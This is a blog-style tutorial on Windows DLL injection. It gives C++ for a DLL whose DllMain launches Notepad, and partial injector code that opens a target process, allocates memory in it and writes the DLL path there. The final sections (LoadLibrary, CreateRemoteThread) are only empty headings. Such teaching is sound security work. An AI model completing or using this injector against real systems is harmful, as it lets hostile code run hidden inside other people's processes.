## Process Injection - DLL Injection
DLL Injection is a kind of process injection techniques but unlike loading shellcode into a running process, DLL Injection involves injecting and loading a malicious DLL into the running process.

**What is DLL?**    
Think of it as libraries needed to run a program. These libraries can be used by different programs at the same time. But in order to use such libraries/DLL/modules, a program needs to have them imported while compiling their code. When the DLL is loaded, it will execute the main function within the DLL, which is **DllMain**. Here in the image below, we can see the list of modules/DLLs that a program can have, for example, for `Calc.exe`.

Or, you can go through the [blog](https://nirajkharel.com.np/posts/process-module-enumeration/) I wrote before to enumerate the loaded DLLs/modules in the running process.

As we discussed earlier, `DllMain` serves as the entry point function for each loaded DLL. Let's explore what `DllMain` is and how we can create our own malicious DLL:
- On Microsoft Visual Code Studio, create a new project and select **Dynamic-Link Library** as the project type.
- Open the project, and you will be presented with default code for the DLL.


```c++
// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

In the code above, we can see that it contains a `DllMain` function which has three different parameters:

- **HMODULE hModule**: Handle to the DLL module.
- **DWORD ul_reason_for_call**: Reason for calling the function. It contains different cases like `DLL_PROCESS_ATTACH`, `DLL_THREAD_ATTACH`, `DLL_THREAD_DETACH`, and `DLL_PROCESS_DETACH`. It performs actions based on the reason for calling. For example, the case `DLL_PROCESS_ATTACH` is executed when the DLL is loaded into the address space of the process.
- **LPVOID lpReserved**: Reserved for future use and is typically `NULL`.

If we want to execute malicious code or run any program within the process through our malicious DLL, we need to place that code inside the `DLL_PROCESS_ATTACH` case. For example, to simply open `Notepad.exe` through this DLL, we can use `CreateProcess` inside the `DllMain` function.

```c++
#include "pch.h"
#include <windows.h>
#pragma comment(lib, "user32.lib")

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  nReason, LPVOID lpReserved) {
    switch (nReason) {
    case DLL_PROCESS_ATTACH:
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));

        // Create the calculator process
        if (CreateProcess(
            L"C:\\Windows\\System32\\Notepad.exe", // Application name
            NULL,    // Command line arguments
            NULL,    // Process handle not inheritable
            NULL,    // Thread handle not inheritable
            FALSE,   // Set handle inheritance to FALSE
            0,       // No creation flags
            NULL,    // Use parent's environment block
            NULL,    // Use parent's starting directory 
            &si,     // Pointer to STARTUPINFO structure
            &pi)     // Pointer to PROCESS_INFORMATION structure
            ) {
            // Close process and thread handles. 
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        break;
    case DLL_PROCESS_DETACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

```

I would also recommend you watch the video **[Everything You Ever Wanted to Know about DLLs](https://www.youtube.com/watch?v=JPQWQfDhICA&t=1749s)** on YouTube. It explains pretty much everything you need to know.

Compile the code and execute the DLL using **rundll32.exe**. You should see that the DLL file has been loaded successfully and that `Notepad.exe` has been opened, which means the `CreateProcess` function inside `DllMain` has been executed.

Now that we have our malicious DLL ready, letâ€™s go through the process of injecting it into a running process.

With our malicious DLL compiled, we first create a handle to the target process using **OpenProcess**. We then use that handle to allocate virtual address space in the memory of the running process with **VirtualAllocEx** and write the path of the DLL file into this memory using **WriteProcessMemory**.

Once that is done, we need to load the DLL into memory. We have written the DLL path into the memory using **WriteProcessMemory**, and now we use **CreateRemoteThread** to execute the **LoadLibrary** API. This will load the DLL specified by the path on the buffer address into the target process. **CreateRemoteThread** provides a handle to the newly created thread, which executes the DLL loading function.

By doing this, we successfully inject the DLL into the running process.

### Headers and Arguments
Let's first defined the needed headers and the argument that we need to pass it on. Here we will pass the process Id as an argument and DLL file will be defined within code itself.
```c++
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

char injectDLL[] = "C:\\Users\\theni\\source\\repos\\DLLInjection\\ARM64\\Debug\\DLLInjection.dll";
unsigned int dllLength = sizeof(injectDLL) + 1;

int main(int argc, char* argv[]) {


    // parse process ID
    if (atoi(argv[1]) == 0) {
        printf("PID not found :( exiting...\n");
        return -1;
    }
    printf("PID: %i", atoi(argv[1]));
```

### OpenProcess
After identifying the process ID we want to inject into, the next step is to open a handle to the process using the OpenProcess function. I have detailed this function in a [blog post](https://nirajkharel.com.np/posts/process-module-enumeration/#openprocess). It is crucial to provide the necessary permissions: PROCESS_VM_WRITE, PROCESS_VM_OPERATION, and PROCESS_CREATE_THREAD, as we need to access the address, write into the memory, and execute a remote thread.


```c++
 HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, FALSE, DWORD(atoi(argv[1])));
 if (hProcess == NULL) {
     printf("Error opening handle to the process, %u\n", GetLastError());
     return 1;
 }

 printf("Successfully Opened Handle to the Process\n");
```

### VirtualAllocEx
We need to allocate our buffer in the virtual address space of the running process. Before doing that, we must allocate or reserve a region of memory within the virtual address space. This can be done using the **VirtualAllocEx** function of the Windows API. I have already described this [in detail here](https://nirajkharel.com.np/posts/process-injection-shellcode/#buffer-allocation---virtualallocex).


```c++

    // allocate memory buffer for remote process
    LPVOID lpAlloc = VirtualAllocEx(hProcess, NULL, dllLength, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
    if (lpAlloc == NULL) {
        printf("Error Allocating memory to the process, %u\n", GetLastError());
        return 1;
    }
    printf("Successfully Allocated memory to the Process\n");
```

### WriteProcessMemory
Once we have allocated memory in the virtual address space, the next task is to write the DLL path into that memory. This was also explained in detail in [a previous blog post](https://nirajkharel.com.np/posts/process-injection-shellcode/#write-buffer-into-the-allocated-memory---writeprocessmemory).
```c++
 // "copy" evil DLL between processes
 BOOL bWrite = WriteProcessMemory(hProcess, lpAlloc, injectDLL, dllLength, NULL);
 if (bWrite == NULL) {
     printf("Error writing DLL to the process, %u\n", GetLastError());
     return 1;
 }
 printf("Successfully copied DLL into the Process\n");
```

### LoadLibrary

### CreateRemoteThread

### WaitForSingleObject and CloseHandle
